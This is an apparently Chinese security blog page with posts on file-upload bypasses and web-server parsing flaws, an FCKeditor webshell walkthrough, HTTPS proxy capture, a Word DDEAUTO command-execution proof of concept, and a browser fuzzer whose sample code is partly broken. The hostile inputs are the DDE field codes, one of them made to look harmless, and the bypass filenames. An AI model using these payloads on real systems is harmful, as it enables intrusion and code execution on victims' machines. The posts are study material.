+<p><strong>造成恶意文件上传的原因主要有三种：</strong><br><strong><em>文件上传时检查不严。</em></strong>没有进行文件格式检查。一些应用仅仅在客户端进行了检查，而在专业的攻击者眼里几乎所有的客户端检查都等于没有检查，攻击者可以通过NC，Fiddler等断点上传工具轻松绕过客户端的检查。一些应用虽然在服务器端进行了黑名单检查，但是却可能忽略了大小写，如将.php改为.Php即可绕过检查；一些应用虽然在服务器端进行了白名单检查却忽略了%00截断符，如应用本来只允许上传jpg图片，那么可以构造文件名为xxx.php%00.jpg,其中%00为十六进制的0x00字符，.jpg骗过了应用的上传文件类型检测，但对于服务器来说，因为%00字符截断的关系，最终上传的文件变成了xxx.php。</p>
+<p><strong><em>文件上传后修改文件名时处理不当。</em></strong>一些应用在服务器端进行了完整的黑名单和白名单过滤，在修改已上传文件文件名时却百密一疏，允许用户修改文件后缀。如应用只能上传.doc文件时攻击者可以先将.php文件后缀修改为.doc，成功上传后在修改文件名时将后缀改回.php。</p>
+<p><strong><em>使用第三方插件时引入。</em></strong>好多应用都引用了带有文件上传功能的第三方插件，这些插件的文件上传功能实现上可能有漏洞，攻击者可通过这些漏洞进行文件上传攻击。如著名的博客平台WordPress就有丰富的插件，而这些插件中每年都会被挖掘出大量的文件上传漏洞。</p>
+<h3 id="防御方法："><a href="#防御方法：" class="headerlink" title="防御方法："></a>防御方法：</h3><ol>
+<li>文件上传的目录设置为不可执行<br>只要web容器无法解析该目录下面的文件，即使攻击者上传了脚本文件，服务器本身也不会受到影响，因此这一点至关重要。</li>
+<li>判断文件类型<br>在判断文件类型时，可以结合使用MIME Type、后缀检查等方式。在文件类型检查中，强烈推荐白名单方式，黑名单的方式已经无数次被证明是不可靠的。此外，对于图片的处理，可以使用压缩函数或者resize函数，在处理图片的同时破坏图片中可能包含的HTML代码。</li>
+<li>使用随机数改写文件名和文件路径<br>文件上传如果要执行代码，则需要用户能够访问到这个文件。在某些环境中，用户能上传，但不能访问。如果应用了随机数改写了文件名和路径，将极大地增加攻击的成本。再来就是像shell.php.rar.rar和crossdomain.xml这种文件，都将因为重命名而无法攻击。</li>
+<li>单独设置文件服务器的域名<br>由于浏览器同源策略的关系，一系列客户端攻击将失效，比如上传crossdomain.xml、上传包含Javascript的XSS利用等问题将得到解决。</li>
+</ol>
+<p>客户端校验绕过；<br>服务端校验绕过；<br>文件头校验绕过；<br>拓展名校验绕过；</p>
+<p> <a href="http://wt7315.blog.51cto.com/10319657/1865580" target="_blank" rel="noopener">参考网址</a> </p>
+<p>八.  解析漏洞总结</p>
+<h3 id="IIS解析漏洞："><a href="#IIS解析漏洞：" class="headerlink" title="IIS解析漏洞："></a>IIS解析漏洞：</h3><h4 id="目录解析-6-0"><a href="#目录解析-6-0" class="headerlink" title="目录解析(6.0)"></a>目录解析(6.0)</h4><p>形式：<a href="http://www.xxx.com/xx.asp/xx.jpg" target="_blank" rel="noopener">www.xxx.com/xx.asp/xx.jpg</a><br>原理: 服务器默认会把.asp，.asp目录下的文件都解析成asp文件。</p>
+<h4 id="文件解析"><a href="#文件解析" class="headerlink" title="文件解析"></a>文件解析</h4><p>形式：<a href="http://www.xxx.com/xx.asp;.jpg" target="_blank" rel="noopener">www.xxx.com/xx.asp;.jpg</a><br>原理：服务器默认不解析;号后面的内容，因此xx.asp;.jpg便被解析成asp文件了。</p>
+<h4 id="解析文件类型"><a href="#解析文件类型" class="headerlink" title="解析文件类型"></a>解析文件类型</h4><p>IIS6.0 默认的可执行文件除了asp还包含这三种 :<br>/test.asa<br>/test.cer<br>/test.cdx</p>
+<h3 id="Apache-解析漏洞"><a href="#Apache-解析漏洞" class="headerlink" title="Apache 解析漏洞"></a>Apache 解析漏洞</h3><h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>Apache 解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。比如 test.php.qwe.asd “.qwe”和”.asd” 这两种后缀是apache不可识别解析,apache就会把wooyun.php.qwe.asd解析成php。</p>
+<h4 id="漏洞形式"><a href="#漏洞形式" class="headerlink" title="漏洞形式"></a>漏洞形式</h4><p><a href="http://www.xxxx.xxx.com/test.php.php123" target="_blank" rel="noopener">www.xxxx.xxx.com/test.php.php123</a><br>其余配置问题导致漏洞<br>（1）如果在 Apache 的 conf 里有这样一行配置 AddHandler php5-script .php 这时只要文件名里包含.php 即使文件名是 test2.php.jpg 也会以 php 来执行。<br>（2）如果在 Apache 的 conf 里有这样一行配置 AddType application/x-httpd-php .jpg 即使扩展名是 jpg，一样能以 php 方式执行。</p>
+<h4 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h4><p>1.apache配置文件，禁止.php.这样的文件执行，配置文件里面加入<br>2.用伪静态能解决这个问题，重写类似.php.*这类文件，打开apache的httpd.conf找到LoadModule rewrite_module modules/mod_rewrite.so<br>把#号去掉，重启apache,在网站根目录下建立.htaccess文件</p>
+<h3 id="Nginx解析漏洞"><a href="#Nginx解析漏洞" class="headerlink" title="Nginx解析漏洞"></a>Nginx解析漏洞</h3><h4 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>Nginx默认是以CGI的方式支持PHP解析的，普遍的做法是在Nginx配置文件中通过正则匹配设置SCRIPT_FILENAME。当访问<a href="http://www.xx.com/phpinfo.jpg/1.php这个URL时，$fastcgi_script_name会被设置为“phpinfo.jpg/1.php”，然后构造成SCRIPT_FILENAME传递给PHP" target="_blank" rel="noopener">www.xx.com/phpinfo.jpg/1.php这个URL时，$fastcgi_script_name会被设置为“phpinfo.jpg/1.php”，然后构造成SCRIPT_FILENAME传递给PHP</a> CGI，但是PHP为什么会接受这样的参数，并将phpinfo.jpg作为PHP文件解析呢?这就要说到fix_pathinfo这个选项了。 如果开启了这个选项，那么就会触发在PHP中的如下逻辑：<br>PHP会认为SCRIPT_FILENAME是phpinfo.jpg，而1.php是PATH_INFO，所以就会将phpinfo.jpg作为PHP文件来解析了</p>
+<h4 id="漏洞形式-1"><a href="#漏洞形式-1" class="headerlink" title="漏洞形式"></a>漏洞形式</h4><p><a href="http://www.xxxx.com/UploadFiles/image/1.jpg/1.php" target="_blank" rel="noopener">www.xxxx.com/UploadFiles/image/1.jpg/1.php</a><br><a href="http://www.xxxx.com/UploadFiles/image/1.jpg%00.php" target="_blank" rel="noopener">www.xxxx.com/UploadFiles/image/1.jpg%00.php</a><br><a href="http://www.xxxx.com/UploadFiles/image/1.jpg/%20\0.php" target="_blank" rel="noopener">www.xxxx.com/UploadFiles/image/1.jpg/%20\0.php</a><br>另外一种手法：上传一个名字为test.jpg，然后访问test.jpg/.php,在这个目录下就会生成一句话木马shell.php。</p>
+<h3 id="IIS7-5-解析漏洞"><a href="#IIS7-5-解析漏洞" class="headerlink" title="IIS7.5 解析漏洞"></a>IIS7.5 解析漏洞</h3><p>反序列化IIS7.5的漏洞与nginx的类似，都是由于php配置文件中，开启了cgi.fix_pathinfo，而这并不是nginx或者iis7.5本身的漏洞。</p>
+<h4 id="配合操作系统文件命令规则"><a href="#配合操作系统文件命令规则" class="headerlink" title="配合操作系统文件命令规则"></a>配合操作系统文件命令规则</h4><p>上传不符合windows文件命名规则的文件名<br>test.asp.<br>test.asp(空格)<br>test.php:1.jpg<br>test.php:: $DATA<br>会被windows系统自动去掉不符合规则符号后面的内容。</p>
+<p>如图访问ip/Netsys/HtmlEdit/fckeditor/editor/filemanager/connectors/test.html<br><img src="/2017/11/13/web常见通用漏洞原理总结/image1.png" title="web常见通用漏洞原理总结"></p>
+<p>点击Create Folder新建文件夹<br><img src="/2017/11/13/web常见通用漏洞原理总结/image2.png" title="web常见通用漏洞原理总结"></p>
+<p>用brup suite进行改包，将%2F改为a.asp。<br><img src="/2017/11/13/web常见通用漏洞原理总结/image3.png" title="web常见通用漏洞原理总结"></p>
+<p>点击Get Folders获得文件夹。<br><img src="/2017/11/13/web常见通用漏洞原理总结/image4.png" title="web常见通用漏洞原理总结"></p>
+<p>上传文件，我这里上传了一句话图片木马，然后能看到上传的路径，访问的是1.asp/FI201610191827336199.jpg，会被当作asp执行，用菜刀连接getshell。<br><img src="/2017/11/13/web常见通用漏洞原理总结/image5.png" title="web常见通用漏洞原理总结"></p>
+<h2 id="九-变量覆盖漏洞"><a href="#九-变量覆盖漏洞" class="headerlink" title="九.  变量覆盖漏洞"></a>九.  变量覆盖漏洞</h2><p>register_global=ON时，变量来源可能是各个不同的地方，比如页面的表单，Cookie等。通过$GLOBALS获取的变量，也可能导致变量覆盖。<br>extract()变量覆盖，PHP extract() 函数从数组中把变量导入到当前的符号表中。对于数组中的每个元素，键名用于变量名，键值用于变量值。</p>
+<h2 id="十-反序列化漏洞（对象注入漏洞）"><a href="#十-反序列化漏洞（对象注入漏洞）" class="headerlink" title="十.  反序列化漏洞（对象注入漏洞）"></a>十.  反序列化漏洞（对象注入漏洞）</h2><p>序列化是什么serialize() 是为了将对象或数组等转变为正常的字符串。用于保存内容或传参数等等。为什么要有序列化这种机制呢?在传递变量的过程中，有可能遇到变量值要跨脚本文件传递的过程。<br>反序列化就是把一个序列化好的字符串作为输入，返回原来的数组和对象。<br>serialize和unserialize就是用来解决这一问题的。serialize可以将变量转换为字符串并且在转换中可以保存当前变量的值；unserialize则可以将serialize生成的字符串变换回变量。让我们在3.php中添加序列化的例子，看看php对象序列化之后的格式。</p>
+<p>Php中有这样的特性函数被称为魔幻方法。他们可以被自动的调用。所以这些函数不需要通过函数来调用。<br>反序列化都送通过_construct()初始化，通过_wakeup()苏醒，执行完后有 _destruct() 销毁。那么这些魔幻函数中存在的代码实惠被执行的。而这些代码又恰好被我们控制的话。漏洞就产生了。<br>利用的两个基本条件：<br>应用程序中必须含有一个实现某一个php魔幻方法的类，可以用这个类进行攻击。<br>调用脆弱的unserialize() ,必须声明攻击旗舰所使用的所有类。否则必须为这些类支持对象自动加载。<br>最大的问题在于人：理解应用程序以能够利用这种类型的漏洞，因为它可能需要大量的时间来阅读和理解代码。<br><a href="http://blog.csdn.net/qq_32400847/article/details/53873275" target="_blank" rel="noopener">参考链接1</a><br><a href="https://securitycafe.ro/2015/01/05/understanding-php-object-injection/" target="_blank" rel="noopener">参考链接2</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2017/11/13/web常见通用漏洞原理总结/" data-id="cjk8lemlp000e48s3jnne4k3e" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-代理设置抓https包" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2017/11/13/代理设置抓https包/" class="article-date">
+  <time datetime="2017-11-13T12:36:09.000Z" itemprop="datePublished">2017-11-13</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/11/13/代理设置抓https包/">代理设置抓https包</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Fiddle-抓Https-的正确姿势。"><a href="#Fiddle-抓Https-的正确姿势。" class="headerlink" title="Fiddle 抓Https 的正确姿势。"></a>Fiddle 抓Https 的正确姿势。</h1><p>一直对抓HTTPS包没什么感觉，因为很久以前设置过，后来忘记了。印象中是设置下option 的 https 选项卡就可以了。<br>最近测试android的程序，这个方法就不太灵了。</p>
+<p>解决姿势：<br>不论是我们用的fiddle还是brupsuite  代理服务器都提供了一个安装证书的地址，这个地址就是代理地址。<br>访问一下代理地址，有个按钮叫<br>FiddlerRoot certificate 。安装证书就可以啦。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2017/11/13/代理设置抓https包/" data-id="cjk8lemln000d48s36gnb4foi" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/http代理/">http代理</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-微软office-word-excel-无宏命令执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2017/11/13/微软office-word-excel-无宏命令执行漏洞/" class="article-date">
+  <time datetime="2017-11-13T11:54:07.000Z" itemprop="datePublished">2017-11-13</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/11/13/微软office-word-excel-无宏命令执行漏洞/">微软office word&amp;excel 无宏命令执行漏洞</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="微软offcie-Word-无宏命令执行漏洞"><a href="#微软offcie-Word-无宏命令执行漏洞" class="headerlink" title="微软offcie Word 无宏命令执行漏洞"></a>微软offcie Word 无宏命令执行漏洞</h1><p>最初看到问这个漏洞是zc发给了我一个链接。</p>
+<p><a href="https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/" target="_blank" rel="noopener">链接地址</a></p>
+<p>然后就在360第二天就在360播报上面看到了翻译版本了。</p>
+<p>以前一提到word命令执行，一般会想到宏。无宏执行不是没想过。这个漏洞就是无宏执行任意命令，配后powershell，成功率应该还是挺大的。</p>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>windows 提供了多种方法在程序之间进行数据传输。 其中一种方法就是 Dynamic Data Exchange(DDE)协议，字面意思应该是动态数据交换。DDE协议其实就是一些列的消息和指导参考。 他通过传送信息通过共享数据和共享内存。程序可以使用DDE协议用来一次性的数据传输和连续交换，应用程序在新的数据可用是，会将更新发送给对方。</p>
+<h2 id="如何使用这个漏洞"><a href="#如何使用这个漏洞" class="headerlink" title="如何使用这个漏洞"></a>如何使用这个漏洞</h2><p>  这里的演示说使用还有点早，其实是个构建POC的过程。</p>
+<p>  首先新建一个文档。按照下面顺序建立一个域对象</p>
+<p>  插入 –&gt;  文档部件 –&gt;  域</p>
+ <img src="/2017/11/13/微软office-word-excel-无宏命令执行漏洞/1.png" title="微软office-word-excel-无宏命令执行漏洞">
+<p>  点开有选择左边的 =（Formula）.</p>
+<p>  这是时候你的文档会出现一个异常的公式结尾，在这个上面右击，切换到代码域点击确定。看到这个对象的实际代码，我们将要修改成DDE的格式。</p>
+<p>  <code>{DDEAUTO c:\\windows\\system32\\cmd.exe &quot;/k calc.exe&quot;  }</code></p>
+<p>  DDEAUTO关键字告诉WORD这是一个DDE域，那个当文档打开，第二个参数所代表的程序就会被执行，第二个藏尸是全部路径的执行程序，还有后面一个双引号的内容作为一个参数去执行。</p>
+ <img src="/2017/11/13/微软office-word-excel-无宏命令执行漏洞/2.png" title="微软office-word-excel-无宏命令执行漏洞">
+<p>  还有一种是用CTRL + F9 直接创建文档，让后插入DDE代码， 亲测可用，然后保证神docx.</p>
+<p>  执行漏洞和原理还是比较简单的。</p>
+<p>  参考文档在最后给出了其它方法。修改以后觉得提示框变了。没研究太深入</p>
+<p>  构造POC很简单。挺牛逼的一个洞洞。</p>
+<p>  原作者给出了视频操作连接，还看不懂的可以看视频：</p>
+<p>  <a href="https://sensepost.com/img/pages/blog/2017/macro-less-code-exec-in-msword/WordDDE.mp4?_=2" target="_blank" rel="noopener">https://sensepost.com/img/pages/blog/2017/macro-less-code-exec-in-msword/WordDDE.mp4?_=2</a></p>
+<p>  另外更新点推特友人用的代码</p>
+<p>  <code>{ DDEAUTO &quot;Microsoft Word&quot; &quot;Document \\..\\..\\..\\..\\Windows\\File.docx\\..\\System32\\cmd.exe&quot; &quot;&quot; }</code></p>
+<p>  这样提示框就变得很和谐。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2017/11/13/微软office-word-excel-无宏命令执行漏洞/" data-id="cjk8lemly000m48s3nqtc4mua" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞分析/">漏洞分析</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-学习puzzor的简单浏览器fuzzer工具的笔记" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2017/11/13/学习puzzor的简单浏览器fuzzer工具的笔记/" class="article-date">
+  <time datetime="2017-11-13T11:40:39.000Z" itemprop="datePublished">2017-11-13</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/11/13/学习puzzor的简单浏览器fuzzer工具的笔记/">学习puzzor的简单浏览器fuzzer工具的笔记</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Fuzz-随手记"><a href="#Fuzz-随手记" class="headerlink" title="Fuzz 随手记"></a>Fuzz 随手记</h1><p>关于浏览器fuzzer，核心部分应该是如何生成模版。现在对afl的dictionary还是有些疑惑。所以只好看看想想其它思路。</p>
+<h2 id="编写fuzzer的思路"><a href="#编写fuzzer的思路" class="headerlink" title="编写fuzzer的思路"></a>编写fuzzer的思路</h2><p>fuzzer无非就是生成用例，程序执行，异常监控。<br>但是真要实现这个原理感觉细节也是相当多。puzzor总结的几个问题挺好的。<br>1）如何生成case（用例）<br>2）如何捕获异常<br>==3）如何去重==<br>4）是否考虑复现<br>5）其它</p>
+<p>一个好的fuzzer，至少在自动测试和异常检测上做的应该很完善。</p>
+<p>puzzor的框架思路是生成静态html，通过函数调用启动浏览器进程，用调试器挂载浏览器进程，最后让浏览器自动处理。</p>
+<p>很简单的逻辑。可惜我想太多。没有考虑python,而是希望修改现成框架来fuzz。导致现在一直没有进步。</p>
+<h3 id="浏览器fuzzing工具的实现"><a href="#浏览器fuzzing工具的实现" class="headerlink" title="浏览器fuzzing工具的实现"></a>浏览器fuzzing工具的实现</h3><p>定义一个generate()函数，函数中将会在遵循html的语法规范的基础上生成水迹的内容写到html文件中。注意到MAX_HTML_COUNT 参数为生成html文件的数量。<br>代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">def generate():</span><br><span class="line">    for i in range(0,MAX_HTML_COUNT):</span><br><span class="line">        html=&quot;&lt;!doctype html&gt;\n\t&lt;html&gt;\n\t\t&lt;HEAD&gt;&lt;/HEAD&gt;\n&quot;</span><br><span class="line">        html=&quot;&lt;\t\t\t&lt;script type=text/javascript&gt;\n&quot;</span><br><span class="line">        html=&quot;\t\t\t\tfor(var start = Date.now(); Date.now() - start &lt;= 500; &#123;&#125;&quot;</span><br><span class="line">        html=&quot;\t\t\t\twindows.location.href = &apos;%d.html&apos;;&quot;%(i+1)+&quot;\n&quot;</span><br><span class="line">        html=&quot;\t\t\t&#125;\n&quot;</span><br><span class="line">        html=&quot;\t\t&lt;/script&gt;\n&quot;</span><br><span class="line">        html=&quot;\t&lt;body onload()=&apos;go()&apos;&gt;\n&quot;</span><br><span class="line">        html=&quot;\t&quot;+random_str(8)+&quot;\n&quot;</span><br><span class="line">        html+=&quot;\t&lt;/body&gt;\n\t&lt;/html&gt;&quot;</span><br><span class="line">        f = open(os.path.abspath(ox.path.dirname(__file__))+&apos;\\Data\\Case\\%d.html&apos;%i,&apos;w&apos;)</span><br><span class="line">        f.write(html)</span><br><span class="line">        f.close()</span><br></pre></td></tr></table></figure></p>
+<p>代码中的两个细节，让我拜服<br>1） for（var start=Date.now();Date.now() -start &lt;= 500; {}）<br>这个是在做延时处理。为什么用for循环而不用普通判断。我不知道。但是我觉得这个for循环看起来屌屌的。很帅。<br>2）”windows.location.href = ‘%d.html’;”%(i+1)+”\n”  这个是跳转的下一个url吧。</p>
+<p>异常监测，puzzor使用了pydbg，虽然几年前我就会知道pydbg的存在。但是一直嫌弃它丑，没用。直到看到puzzor这么用，感觉被打通了任督二脉，以前的一些fuzz思路全通了。</p>
+<p>Puzzor利用pydbg attach程序并且在av发生的时候进行处理接下来我们定义start_debug 函数并将EAV类型异常的回调函数设置为AV函数，代码如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">def start_debugger(debugger,pid):</span><br><span class="line">    try:</span><br><span class="line">        debugger.set_callback(EXCEPTION_ACCESS_VIOLATION,av)</span><br><span class="line">        debugger.attach(pid)</span><br><span class="line">        debugger.debug_event_loop()</span><br><span class="line">    except Exception as err:</span><br><span class="line">        print err</span><br></pre></td></tr></table></figure></p>
+<p>av的代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">def av(dbg):</span><br><span class="line">    if dbg.dbg.u.Exception.dwFirstChance:</span><br><span class="line">        return DBG_EXCEPTION_NOT_HANDLED</span><br><span class="line">    h = hashlib.md5()</span><br><span class="line">    h.update(dbg.disasm(dbg.context.Eip))#计算EIP的hash值？？做社么</span><br><span class="line">    if(os.path.exists(os.path.abspath(os.path.dirname(__file__))+&quot;\\DATA\\Crash\\&quot;+h.hexdigest())):#如果已经存在该hash则返回。</span><br><span class="line">    dbg.terminate_process()</span><br><span class="line">    return DGB_EXCEPTION_NOT_HANDLED</span><br><span class="line">    shutil.copytree(os.path.abspath(os.path.dirname(__file__))+&quot;\\Data\Cases&quot;，os,path.abspath(os.path.dirname(__file__))+&quot;\\Data\\Crash\\&quot;+h.hexdigest())</span><br></pre></td></tr></table></figure></p>
+<p>av是异常发生时的处理函数，这个我们会计算异常发生时的EIP的hash，计算出hash值后判断是不是已经发生过相同的hash，如果没有，就把当前测试的html拷贝一份，当然这里以EIP的指令作为区分是否合适值得讨论，这个问题也是一开始说的问题3，一下有几种考虑<br>第一：不同地址的重复指令肯定会有很多，仅仅使用指令作为hash肯定会有问题，<br>第二：即便是同一条指令引起的av，调用栈的不同也有可能。<br>第三：等等</p>
+<p>最后对于问题4，我们这里采用静态生成并进行fuzz的时候不需要考虑复现问题，当然是目前不需要，因为我们没有加入资源竞争的处理，如果这一部分加上的话复现这一块就会变得很复杂。</p>
+<p>整体代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line">__author__ = &apos;Puzzor&apos;</span><br><span class="line">import os,win32com.client,thread,time,random</span><br><span class="line">from pydbg import *</span><br><span class="line">import hashlib,shutil</span><br><span class="line">from pydbg.defines import *</span><br><span class="line">  </span><br><span class="line">MAX_HTML_COUNT=100</span><br><span class="line">WMI = win32com.client.GetObject(&apos;winmgmts:&apos;)</span><br><span class="line">  </span><br><span class="line">def random_str(randomlength=8):</span><br><span class="line">    strValue = &apos;&apos;</span><br><span class="line">    chars = &apos;AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0123456789~!@#$%^&amp;*()&apos;</span><br><span class="line">    length = len(chars) - 1</span><br><span class="line">    for i in range(randomlength):</span><br><span class="line">        strValue+=chars[random.randint(0, length)]</span><br><span class="line">    return strValue</span><br><span class="line">  </span><br><span class="line">def buildDir():</span><br><span class="line">    try:</span><br><span class="line">        os.mkdir(os.path.abspath(os.path.dirname(__file__))+&quot;\\Data&quot;)</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br><span class="line">    try:</span><br><span class="line">        os.mkdir(os.path.abspath(os.path.dirname(__file__))+&quot;\\Data\\Cases&quot;)</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br><span class="line">    try:</span><br><span class="line">        os.mkdir(os.path.abspath(os.path.dirname(__file__))+&quot;\\Data\\Crash&quot;)</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">def av(dbg):</span><br><span class="line">    if dbg.dbg.u.Exception.dwFirstChance:</span><br><span class="line">        return DBG_EXCEPTION_NOT_HANDLED</span><br><span class="line">    h=hashlib.md5()</span><br><span class="line">    h.update(dbg.disasm(dbg.context.Eip))#计算EIP的hash值</span><br><span class="line">    if(os.path.exists(os.path.abspath(os.path.dirname(__file__))+&quot;\\Data\\Crash\\&quot;+h.hexdigest())):#如果已经存在该hash则返回</span><br><span class="line">        dbg.terminate_process()</span><br><span class="line">        return DBG_EXCEPTION_NOT_HANDLED</span><br><span class="line">    shutil.copytree(os.path.abspath(os.path.dirname(__file__))+&quot;\\Data\\Cases&quot;,os.path.abspath(os.path.dirname(__file__))+&quot;\\Data\\Crash\\&quot;+h.hexdigest())#将此轮测试例拷贝</span><br><span class="line">  </span><br><span class="line">def start_debugger (debugger, pid):</span><br><span class="line">    try:</span><br><span class="line">        debugger.set_callback(EXCEPTION_ACCESS_VIOLATION, av)</span><br><span class="line">        debugger.attach(pid)</span><br><span class="line">        debugger.debug_event_loop()</span><br><span class="line">    except Exception as err:</span><br><span class="line">        print err</span><br><span class="line">  </span><br><span class="line">def EnumerateProcesses(processName):</span><br><span class="line">    processList = WMI.ExecQuery(&quot;SELECT * FROM Win32_Process where name = &apos;%s&apos;&quot;%processName)</span><br><span class="line">    return processList</span><br><span class="line">  </span><br><span class="line">def fuzz(crash_wait_time):</span><br><span class="line">    kernel32 = windll.kernel32</span><br><span class="line">    while True:</span><br><span class="line">        os.popen(&apos;taskkill.exe /im:iexplore.exe /f&apos;)</span><br><span class="line">        os.popen(&apos;taskkill.exe /im:WerFault.exe /f&apos;)#错误报告进程</span><br><span class="line">        buildDir()</span><br><span class="line">        generate()#生成测试例</span><br><span class="line">        db=pydbg()</span><br><span class="line">        kernel32.WinExec(&quot;C:\Program Files (x86)\Internet Explorer\iexplore.exe &quot;+os.path.abspath(os.path.dirname(__file__))+&quot;\\Data\\Cases\\0.html&quot;,6)</span><br><span class="line">for process in EnumerateProcesses(&quot;iexplore.exe&quot;):#枚举进程</span><br><span class="line">            thread.start_new_thread(start_debugger, (db,int(process.Handle)))#尝试附加进程</span><br><span class="line">        time.sleep(crash_wait_time)</span><br><span class="line">  </span><br><span class="line">if __name__==&quot;__main__&quot;:</span><br><span class="line">    crash_wait_time=10#等待时间，主要是等待执行100个html执行完成，自行调整</span><br><span class="line">fuzz(crash_wait_time)</span><br></pre></td></tr></table></figure></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2017/11/13/学习puzzor的简单浏览器fuzzer工具的笔记/" data-id="cjk8lemlv000i48s3ygpwbo2e" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞分析/">漏洞分析</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+
+
+  <nav id="page-nav">
+    
+    <a class="extend prev" rel="prev" href="/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
+  </nav>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/GPP/">GPP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/http代理/">http代理</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mestasploit/">mestasploit</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/漏洞分析/">漏洞分析</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
